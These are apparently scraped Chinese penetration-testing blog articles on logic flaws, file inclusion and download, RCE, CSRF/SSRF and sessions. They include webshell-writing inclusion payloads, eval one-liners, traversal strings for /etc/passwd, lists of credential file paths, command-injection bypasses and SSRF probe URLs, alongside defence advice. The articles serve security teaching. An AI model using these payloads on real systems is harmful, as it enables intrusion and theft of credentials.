即：验证是产生在哪个地方的。所以：如果在访问数据包的时候有传输用户的编号，用户组编号或者类型编号，那么尝试对这个值进行修改，就是测试越权漏洞的基本。 前端安全造成——界面 即前端验证是否有这个权限去执行这个操作，然后放行或者禁止。所以后端不做验证直接全盘接受，如果前端伪造，那么就会有这样的漏洞。其实可以算是后端代码逻辑错误，例如：php代码没有验证是什么权限，只是验证是否登录。 后端安全造成——数据库 通过验证usertype来确定用户权限。 id, username, password, usertype 1, admin, 123456, 1 2, xiaodi, 365567, 2 工具 secscan-authcheck：https://github.com/ztosec/secscan-authcheck 小米范：http://pan.baidu.com/s/1pLjaQKF (privilegechecker)。他就是多个窗口，省了你切换窗口的麻烦。 Authz：Burp的插件 直接在官方那下 登录爆破与支付数据篡改 登录功能点安全问题 爆破测试 一般来说http传输数据流量的时候是不加密传输的，而Https是加密传输的。例如用户名密码，baidu的密码就是经过加密的。但是也不绝对，https不一定对密码进行加密操作，而Http也可能对密码进行加密。 然而，它也是可以被爆破的，md5什么的可以直接爆破。 cookie 验证cookie有误，例如： 【白盒】仅仅验证是否存在COOKIE且COOKIE中的USER是否有值，有的话就放行。这样是不行的。我只要伪造一个USER，随便输入什么东西就绕过了。 【黑盒】收到包，看COOKIE中的值是否是可以操作的，就随便改，碰运气 综合考虑 字典应该如何设置，是结合信息搜集还是用top100字典 验证码如何绕过，图片or数字验证码 登录次数限制 综合考虑多个问题 数据篡改安全 物品购买流程 订购、确认信息、付款 常见篡改参数 商品ID、购买价格/优惠券、订单信息 常见篡改方法 替换支付、重复支付、最小额度支付、负数支付、溢出支付、优惠券支付… 支付接口 1234index.php?s=/wap/pay/wchatQrcodePay //微信支付index.php?s=/wap/pay/alipay //支付宝支付index.php?s=http://www.xiaodi8.com/alipay //调用其他的支付接口payname= pay_name=payname=_GET[‘s’]; 找回机制与接口 找回机制 客户端回显：有时候发送邮箱验证码，会通过包来发送，验证码就藏在发送包的内容中，甚至是图片标签里面就有验证码 Response 状态值：有时候验证完验证码后，服务器会发送Res，里面包含一个CODE，表达是否验证成功，这个时候，我们可以通过Burp拦截回显包，修改CODE值，看看时候是正确的。（当然我们得提前知道这个CODE是什么值的时候是正确的） 验证码爆破：一般4位数数字验证码是可以爆破的 找回流程绕过/更改找回流程 通常发生在邮件/手机的验证码绕过。当发送了包，替换原号码为我们的手机号来收验证码。然后把验证码写上就行。 还有一种是，邮箱收到找回密码的URL，注意观察这个URL有一些参数值是可以改的，改了它看能不能实现跨用户的密码重置。当然，这会有其他问题出现，例如，如何去改这个参数（这个参数如何构成的） 接口攻击（后面会详细） 短信轰炸 来电轰炸 验证码、token与接口 验证码安全 分类：图片，手机或邮箱，语音，视频，操作等 原理：验证生成或验证过程中的逻辑问题 危害：账户权限泄漏，短信轰炸，遍历，任意用户操作等 漏洞：客户端回显(已讲)，验证码复用，验证码爆破(已讲)，绕过等 验证码识别插件工具使用 captcha-killer，Pkav_Http_Fuzz，reCAPTCHA 等 token 安全 基本上述同理，主要是验证中可存在绕过可继续后续测试 token 爆破，token 客户端回显等 客户端访问服务器, 服务器返回一个签名的token给客户端, 服务器和客户端各自保存token。以后每次请求服务器都会携带token token的主要作用： 防止表单重复提交 身份验证 接口安全 调用，遍历，未授权，篡改等 调用案例：短信轰炸 遍历案列：UID 等遍历 callback 回调 JSONP （看跨域共享~） 参数篡改：墨者靶场 防御措施 前后端双重检测 资源 涉及资源 爆破字典：https://github.com/huyuanzhi2/password_brute_dictionary 业务逻辑文章：https://cloud.tencent.com/developer/article/2091084 漏洞文章图","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"业务逻辑","slug":"业务逻辑","permalink":"https://j3f5.github.io/tags/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/"}]},{"title":"文件包含与下载读取基础","slug":"文件包含与下载读取基础","date":"2023-06-02T08:00:56.000Z","updated":"2023-06-02T08:00:56.000Z","comments":true,"path":"articles/2023/06/02/文件包含与下载读取基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96%E5%9F%BA%E7%A1%80/","excerpt":"","text":"文件包含 即一次包含之后就不用再重新写相关代码，直接调用即可。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，这样，如果我们能控制这些参数，就可以进行文件包含。 利用： 有相关的包含函数 该函数内参数可控 常见代码以及脚本函数 造成包含的常见脚本代码 1234567891011&lt;!--#include file=&quot;1.asp&quot; --&gt;&lt;!--#include file=&quot;top.aspx&quot; --&gt;&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;&lt;jsp:include page=&quot;head.jsp&quot;/&gt;&lt;%@ include file=&quot;head.jsp&quot;%&gt;&lt;?php include(&#x27;test.php&#x27;)?&gt; 脚本函数 PHP include()：当使用include()函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。 include_once()：include_once 语句在脚本执行期间包含并运行指定文件。此行为和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含，且 include_once 会返回 true。 include_once()：可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题 require()：当使用require()函数包含文件时，只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行。 require_once()：require_once表达式和 require 表达式完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含。 检测 这里的检测也分白盒黑盒，都差不多老三样 白盒：代码审计 黑盒 公开漏洞 漏扫工具 手工查看参数和功能点 类型与绕过 类型 远程包含（RFI） 本地包含（LFI） 绕过 本地有限制包含 %00截断 条件：magic_quotes_gpc = Off php版本&lt;5.3.4 路径长度截断 条件：windows OS，点号需要长于256；linux OS 长于4096 Windows下目录最大长度为256字节，超出的部分会被丢弃； Linux下目录最大长度为4096字节，超出的部分会被丢弃。 ​ 点号.截断 条件：windows OS，点号需要长于256 远程有限制包含 PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 12allow_url_fopen = On（是否允许打开远程文件）allow_url_include = On（是否允许include/require远程文件） 1234&lt;?php $filename = $_GET[&#x27;filename&#x27;]; include($filename.&quot;.html&quot;);?&gt; 这个限制了包含文件的格式。但是可以绕过。 使用?号：www.xxx.com/include.php?filename=myfile.php? 即把后面的当做参数 使用#(%23)：www.xxx.com/include.php?filename=myfile.php%23 即把后面的当做HTML标签 使用 空格(%20)：www.xxx.com/include.php?filename=myfile.php%20 利用 - php java curl(ssrf) asp 利用 http/https √ √ √ √ gopher √ before JDK1.7 before 7.49.0 不支持\\x00 before version 3 ftp √ √ √ √ file √ √ √ √ dict –with-curlwrappers × √ × imap/pop3 –with-curlwrappers × √ × rtsp –with-curlwrappers √ √ √ smb –with-curlwrappers √ √ √ smtp –with-curlwrappers × √ × telnet –with-curlwrappers × √ × ssh2 受限于allow_url_fopen × × × ogg 受限于allow_url_fopen × × × ldap × × × × php √ × × × zlib/bzip2/zip 受限于allow_url_fopen × × × PHP专属伪协议 协议 allow_url_fopen allow_url_include 用法 file:// off/on off/on ?file=file:///user/desktop/file.txt php://filter off/on off/on ?file=php://filter/read=convert.base64-encode/resource=./index.php php://input off/on on ?file=php://input[POST DATA] &lt;?php phpinfo()?&gt;注：当enctype=”multipart/form-data”时，php://input是无效的。常用：http://127.0.0.1/include.php?file=php://input&lt;br/&gt;[POST DATA部分]&lt;br/&gt;&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt; compress.bzip2:// off/on off/on ?file=compress.bzip2://D:/soft/phpStudy/WW/file.bz2[or]?file=compress.bzip2://./file.bz2 compress.zlib:// off/on off/on ?file=compress.zlib//D:/soft/phpStudy/WWW/filegz[or]?file=compress.zlib://./file.gz data:// on on ?file=data://text/plain,&lt;?php phpinfo()?&gt;[or]?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=也可以:?file=data:text/plain,&lt;?php phpinfo0?&gt;[or]?file=data:text/plain:base64,PD9waAacGhwaW5mbyapPz4= http:// filter:// php://filter/read=convert.base64-encode/resource=[文件名]http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php phar:// 步骤：写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 再用解压函数phar解压即可：?file=phar://压缩包/内部文件 zip:// 相反，这个是压缩函数。用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] 。例如：zip://xxx.png#shell.php PHP伪协议 事实就是支持的协议和封装的协议12种 1234567891011file:// - 访问本地文件系统http:// - 访问http网站ftp:// - 访问FTP（s）URLSphp:// - 访问各个输入输出流zlib:// - 压缩流data：// - 数据（RFC 2397）glob：// -查找匹配的文件路径模型ssh2：// - Secure Shell 2rar:// - RARogg:// - 音频流expect:// - 处理交互式的流 php.ini参数设置 在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。 allow_url_fopen:默认值是ON。允许url里的封装协议访问文件； allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件； 修复 文件下载 注意区别： 文件被解析：文件包含 显示源代码：文件读取 提示文件下载：文件下载 一般链接形式与攻击思路 抓URL，看URL上有什么下载形式的URL 就是在一些下载按钮那，然后你改一下下面的链接就可以下载其他文件了。例如提取下载链接：http://..../?s=asdfagqrebvz==是个base64，我们下载一个文件，观察其文件名，然后把后面的Base64解码，看目录，对应着文件名就可以实现任意文件下载了。 123456download.php?path=download.php?file=down.php?file=data.php?file=readfile.php?file=read.php?filename= 包含参数 1234567891011121314151617181920&amp;RealPath=&amp;FilePath=&amp;ﬁlepath=&amp;Filepath=&amp;Path=&amp;path=&amp;inputFile=&amp;Inputfile=&amp;url=&amp;urls=&amp;Lang=&amp;dis=&amp;data=&amp;Data=&amp;readﬁle=&amp;ﬁlep=&amp;src=&amp;menu=META-INFWEB-INF 漏洞利用 任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。 1234index.php?f=…/…/…/…/…/…/etc/passwdindex.php?f=…/index.phpindex.php?f=ﬁle:///etc/passwdreadfile.php?file=/etc/passwd 常见文件&amp;敏感文件 后台首页日志等可见文件（常见） 数据库配置文件 各种接口文件 密钥信息等文件 常见的敏感文件路径 Windows C:\\boot.ini //查看系统版本 C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件 C:\\Windows\\repair\\sam //存储系统初次安装的密码 C:\\Program Files\\mysql\\my.ini //Mysql配置 C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php配置信息 C:\\Windows\\my.ini //Mysql配置信息 C:\\Windows\\win.ini //Windows系统的一个基本系统配置文件 Linux /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去 /root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub /root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥 /root/.ssh/known_hosts //记录每个访问计算机用户的公钥 /etc/passwd //账户信息 /etc/shadow //账户密码文件 /etc/my.cnf //mysql配置文件 /etc/httpd/conf/httpd.conf //apache配置文件 /root/.bash_history //用户历史命令记录文件 /root/.mysql_history //mysql历史命令记录文件 /proc/mounts //记录系统挂载设备 /porc/config.gz //内核配置文件 /var/lib/mlocate/mlocate.db //全文件路径 /porc/self/cmdline //当前进程的cmdline参数 /usr/local/app/php5/lib/php.ini //PHP配置文件 漏洞修复 部署WAF产品 过滤.，使用户在url中不能回溯上级目录 正则严格判断用户输入参数的格式 配置限定文件访问范围，目录权限设置或单独文件权限设置 将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：http://www.test.com/download?filename=文件名 净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。 任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，需更新其中间件的版本可修复。 要下载的文件地址保存至数据库中。 文件路径保存至数据库，让用户提交文件对应ID下载文件。 用户下载文件之前需要进行权限判断。 文件放在web无法直接访问的目录下。 不允许提供目录遍历服务。 公开文件可放置在web应用程序下载目录中通过链接进行下载。 记录文件下载日志。 文件读取 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。 漏洞产生原因： 任意语言代码读取功能函数 文件读取函数：readfile()、file_get_contents()、fopen()中 $filename没有经过校验或者校验不合格 用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini 漏洞检测 手工查看参数值及功能点（资源下载） 漏洞利用 readfile.php?f=../../../../../../etc/passwd 读取文件：配置文件（数据库，平台，各种敏感文件等） 实例 java web目录 [RoarCTF 2019]Easy Java 一般来说，java web的配置文件必定存在于网页目录：WEB-INF/web.xml，里面有路由以及对应的servlet名等。 Tricks： GET下载不了就换成POST。注意：单纯的修改是不行的，需要用Hackbar发送一个POST包才行。 java WEB-INF/web.xml文件泄露。所有源码文件都在class文件里，组件com.???.???实际上是文件夹com/???/???。 小米路由CNVD漏洞 任意文件读取可以登录后台。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件包含","slug":"文件包含","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"文件读取","slug":"文件读取","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"}]},{"title":"RCE基础-代码执行&命令执行","slug":"RCE基础-代码执行&命令执行","date":"2023-06-02T00:56:20.000Z","updated":"2023-06-02T00:56:17.000Z","comments":true,"path":"articles/2023/06/02/RCE基础-代码执行&命令执行/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/02/RCE%E5%9F%BA%E7%A1%80-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"RCE概述 RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。分为两类： 代码执行 因为需求设计，后台有时候也会把用户的输入作为代码的一部分进行执行，也就造成了远程代码执行漏洞 命令执行 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 注意的是，如果想要挖掘这样的漏洞，如果这个网站本身不需要这些功能，那么基本上就没有这些漏洞出现。所以此漏洞可利用的条件： 有该拓展环境 漏洞函数 可控变量 RCE函数相关 PHP 代码执行 eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort() eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。 命令执行 system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、反引号与$() 有回显（执行并回显） 12&lt;?php system(&#x27;ls&#x27;);?&gt;&lt;?php passthru(&#x27;ls&#x27;);?&gt; 无回显（执行但不回显） 12345&lt;?php echo &quot;&lt;pre&gt;&quot;; echo exec(&#x27;ls&#x27;); echo &quot;&lt;/pre&gt;&quot;;?&gt; 12345&lt;?php echo &quot;&lt;pre&gt;&quot;; echo shell_exec(&#x27;ls&#x27;); echo &quot;&lt;/pre&gt;&quot;;?&gt; JAVA（命令执行） 在Java 开发语言中可以执行系统命令的函数有： Runtime.getRuntime.exec ProcessBuilder.start 其中，Runtime.getRuntime.exec 是在Java1.5 之前提供的，Java1.5 之后则提供了ProcessBuilder 类来构建进程 ProcessBuilder Java.lang.ProcessBuilder 类用于创建操作系统进程，每个ProcessBuilder 实例管理一个进程属性集。start() 方法利用这些属性创建一个新的Process 实例， 可以利用ProcessBuilder 执行命令。 ProcessBuilder 执行命令的方式如下： 12ProcessBuilder pb = new ProcessBuilder(&quot;myCommand&quot;, &quot;myArg&quot;); //ProcessBuilder p = new ProcessBuilder(&quot;ls&quot;,&quot;-al&quot;);Process process = pb.start(); Runtime.getRuntime java.lang.Runtime 公共类中的exec()方法同样也可以执行系统命令，exec()方法的使用方式有以下6 种： 123456789101112//在单独的进程中执行指定的字符串命令public Process exec(String command)//在单独的进程中执行指定的命令和参数public Process exec(String[] cmdarray)//在具有指定环境的单独进程中执行指定的命令和参数public Process exec(String[] cmdarray, String[] envp)//在具有指定环境和工作目录的单独进程中执行指定的命令和参数public Process exec(String[] cmdarray, String[] envp, File dir)//在具有指定环境的单独进程中执行指定的字符串命令public Process exec(String command, String[] envp)//在具有指定环境和工作目录的单独进程中执行指定的字符串命令public Process exec(String command, String[] envp, File dir) 正常执行： 1Process proc = Runtime.getRuntime().exec(&quot;ping 127.0.0.1&quot;); 与ProcessBuilder不同的是，如果他要执行多条命令，则需要输入数组，而非简单拼接： 123Process proc = Runtime.getRuntime().exec(&quot;ping 127.0.0.1;ls&quot;);//运行错误String[] command = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;ping -t 3 127.0.0.1;id&quot;&#125;;Process pro = Runtime.getRuntime().exec(command);//执行成功，他是直接调用了ProcessBuilder执行 所以产生拼接的命令执行漏洞就得按上面的写法，不然还不能拼接~ 除此之外，使用这个函数还有很多需要注意的点： 字符串执行需要替换空格（$&#123;IFS&#125;、$IFS$9）： 如果exec 方法执行的参数是字符串参数，参数中的空格会经过StringTokenizer 处理，处理完成后会改变原有的语义导致命令无法正常执行。例如： 12345cmd=sh -c ls;cat /etc/passwd //执行失败cmd=sh -c ls;id //执行成功cmd=sh -c ls;cat$&#123;IFS&#125;/etc/passwd //执行失败，因为我们的请求中包含无效的字符&#123;&#125;，它不属于保留字符，所以出错！cmd=sh%20-c%20ls;cat$%7BIFS%7D/etc/passwd //编码后执行成功，当然也可以使用$IFS$9 挖掘与防范 挖掘 黑盒测试：网站中有特殊功能，比如Ping、数据库备份等等。 白盒测试：查看命令执行函数是否做过滤。命令执行函数上述有提到 后面将会讲到其他漏洞的复现 防范 敏感函数禁用，尽量不要使用命令执行函数，不能完全控制的危险函数最好不使用。 在进入执行命令函数前进行严格的检测和过滤； 部署WAF 多使用安全API，而不直接利用命令执行函数 利用与绕过 代码注入 利用：利用后端脚本的特殊性对服务器进行攻击。 PHP： phpinfo可以获取到很多信息。例如收集绝对路径**，真实ip，绕过xss的httponly($_SERVER[“HTTP_COOKIE”])，存在oci8推测数据库可能为oracle。 eval写一句话木马getshell之类的。 其绕过方式一般都是替换关键字、关键字大小写、编码等等过滤了PHP代码，可以使用=绕过：&lt;?=eval($_REQUEST['cmd']);?&gt; 【更加详细内容可以去看：WAF绕过-一般性绕过总结】 命令注入 利用该漏洞实际上就是通过管道符、拼接符等方式进行命令注入而达到攻击的目的。 这里写绕过姿势： 黑名单绕过： 关键字绕过 双引号：l''s 反斜杠：l\\s 倒过来写：tac == cat 替换： cat可以由以下来代替 (1)more:一页一页的显示的显示档案内容 (2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页 (3)head:查看头几行 (4)tac:从最后一行开始显示,可以看出tac是cat的反向显示 (5)tail:查看尾几行 (6)nl:显示的时候,顺便输出行号 (7)od:以二进制的方式读取档案内容 (8)vi:一种编辑器，这个也可以查看 (9)vim:一种编辑器,这个也可以查看 (10)sort:可以查看 (11)uniq:可以查看 (12)file -f:报错出具体的内容 (13)base64:输出然后自己解码就好 空格绕过 &lt;&gt;重定向：cat&lt;flag_123 $IFS$9, $&#123;IFS&#125;空字符 逗号与{}：&#123;cat,flag_123&#125; 管道符&amp;，;，|等被过滤（注意，windows不支持;） linux: %0a 回车 %0d 换行 windows: %0a 回车 %1a 作为.bat文件的命令分隔符 其他 管道符的含义 Window系列支持的管道符如下所示。 &quot; | &quot;:直接执行后面的语句。例如：ping 127.0.0.1 | whoami。 “ || ”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 127.0.0.1 || whoami &quot; &amp; &quot; :如果前面的语句为假则直接执行后面的语句,前面的语句可真可假。例如： ping 127.0.0.1 &amp;whoami。 “ &amp;&amp; ”： 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1 &amp;&amp; whoami。 Linux 系统支持的管道符如下所示： “；”执行完前面的语句再执行后面的。例如: ping 127.0.0.1;whoami “ | ”：显示后面语句的执行结果。例如: ping 127.0.0.1 | whoami。 “ || ”： 当前面的语句执行出错时，执行后面的语句。例如： ping 1|| whoami。 “ &amp; ”： 如果前面的语句执行为假则直接执行后面的语句。前面的语句可真可假。例如：ping 127.0.0.1 &amp; whoami。 “ &amp;&amp; ”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： ping 127.0.0.1 &amp;&amp; whoami。 POC与EXP POC是验证 EXP是利用 TIPS 一般使用base64输出文件内容，因为有的字符没办法在屏幕上看见","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://j3f5.github.io/tags/RCE/"}]},{"title":"CSRF与SSRF漏洞基础","slug":"CSRF与SSRF漏洞基础","date":"2023-06-01T06:59:49.000Z","updated":"2023-06-01T06:59:49.000Z","comments":true,"path":"articles/2023/06/01/CSRF与SSRF漏洞基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/01/CSRF%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/","excerpt":"","text":"CSRF 概念以及原理 Cross Site Request Forgery，跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击。 顾名思义，也就是在a.com可以执行（发送）b.com的请求，例如请求b.com删除某个数据。 详细： 攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作 XSS 利用站点内内的信任用户，盗取cookie，CSRF通过伪装成受信任用户请求受信任的网站，利用目标用户的合法身份，以目标的名义执行某些非法参数 利用条件： 已经登录系统 用户访问URL 已存在的网站中让用户跳转 防御 当用户发送重要的请求时输入验证码 设置随机TOKEN —数据包的唯一值 检测referer来源，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败） 限制请求方式只能为post。因为URL跳转一般都是GET，如果限制只能为POST，那么跳转不了，因为带不了数据包块 SSRF 概念、原理与相关注意点 Server-Side Request Forgery，服务器端请求伪造)，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 攻击目标：SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） 形成原因：由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。 可能出现的地方 可能出现的地方 社交分享功能：获取超链接的标题等内容进行显示 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览 在线翻译：给网址翻译对应网页的内容 图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作 数据库内置功能：数据库的比如mongodb的copyDatabase函数 邮件系统：比如接收邮件服务器地址 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞 一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…… 从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php） 漏洞检测 一般发起网络请求中会使用libcurl库，所以他会有各种协议（可以简单执行curl -V）各个协议调用探针：http,file,dict,ftp,gopher 等 漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等 1234http://192.168.64.144/phpmyadmin/file:///D:/www.txtdict://192.168.64.144:3306/infoftp://192.168.64.144:21 代码层面 PHP 123file_get_contents()fsockopen()curl_exec() 以上三个函数使用不当会造成SSRF漏洞 需要注意以下几点： 大部分 PHP 并不会开启 fopen 的 gopher wrapper file_get_contents 的 gopher 协议不能 URLencode file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败 curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用 curl_exec() //默认不跟踪跳转 file_get_contents() // file_get_contents支持php://input协议 JAVA 1Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类 以上几种类引用不当会造成SSRF 网络请求支持的协议如下 http，https，file，ftp，mailto，jar，netdoc 对比php的ssrf，java这块利用相对局限 绕过 数字IP（十进制IP等等） ?@#特殊符号绕过：www.baidu.com?www.me.com 子域名绕过 跳转IP（中转IP） DNS重绑定（例如短地址） 利用 攻击内网进行扫描，识别服务器指纹并攻击 对主机进行端口扫描 运行主机内程序 读取内网信息（file协议） 需要注意的是，回显是能否成功利用的重要的条件，在某些场景协议限定为HTTP模式且没有回显，利用 会相对复杂了。 协议利用 DICT：除了泄露安装软件版本信息，还可以查看端口，**操作内网redis服务（只能一条指令一条指令地发送）**等 File：读取文件 Gopher：万能协议（利用Gopher攻击Redis、攻击Fastcgi 等 FTP(S)/SMB(S)：匿名访问及爆破 Tftp：UDP协议 发送UDP数据包 Telnet：SSH/Telnet匿名访问及爆破 漏洞利用小技巧 crontab -l 显示当前计划任务 crontab -r 清除当前计划任务 端口转发工具 socat 在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行 AddType application/x-httpd-php 防御 统一错误信息 协议限制：http &amp;&amp; https 内网IP限制 域名限制 需要一直解析到IP为止 URL白名单 正则匹配 禁止30x跳转 绕过 数字IP（十进制IP等等） ?@#特殊符号绕过：www.baidu.com?www.me.com、www.a.com@10.10.10.1 子域名绕过 跳转IP（中转IP） DNS重绑定（例如短地址） 指向任意IP的域名：xip.io 常见SSRF漏洞 Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf discuz! 的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换） weblogic的ssrf","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"CSRF","slug":"CSRF","permalink":"https://j3f5.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://j3f5.github.io/tags/SSRF/"}]},{"title":"授权与跨域共享","slug":"授权与跨域共享","date":"2023-05-31T02:02:30.000Z","updated":"2023-05-31T02:02:30.000Z","comments":true,"path":"articles/2023/05/31/授权与跨域共享/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/31/%E6%8E%88%E6%9D%83%E4%B8%8E%E8%B7%A8%E5%9F%9F%E5%85%B1%E4%BA%AB/","excerpt":"","text":"认证、授权与凭证的概念 认证：验证当前用户的身份。例如有一个登陆窗口，只有输入正确的账号密码就算认证成功。 授权：用户授予第三方应用访问该用户某些资源的权限。例如有一个模特，经过一些协定，这模特把自己的肖像权授予商家使用。 凭证：实现认证和授权的前提是需要一种媒介（证书）。例如认证中的账号密码，例如授权中的协定。 COOKIE HTTP 是无状态的协议（对于事务处理没有记忆能力，每次客户端和服务端会话完成时，服务端不会保存任何会话信息）。服务器与浏览器为了进行会话跟踪（知道是谁在访问我），就必须主动的去维护一个状态，这个状态用于告知服务端前后两个请求是否来自同一浏览器。而这个状态需要通过 cookie 或者 session 去实现。 cookie 存储在客户端： cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。 cookie 是不可跨域的： 每个 cookie 都会绑定单一的域名，无法在别的域名下获取使用，一级域名和二级域名之间是允许共享使用的（靠的是 domain）。 重要属性： httpOnly 如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本 读取到该 cookie 的信息，但还是能通过 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全 SESSION session 是另一种记录服务器和客户端会话状态的机制 session 是基于 cookie 实现的，session 存储在服务器端，sessionId 会被存储到客户端的cookie 中 session 认证流程： 用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建对应的 Session 请求返回时将此 Session 的唯一标识信息 SessionID 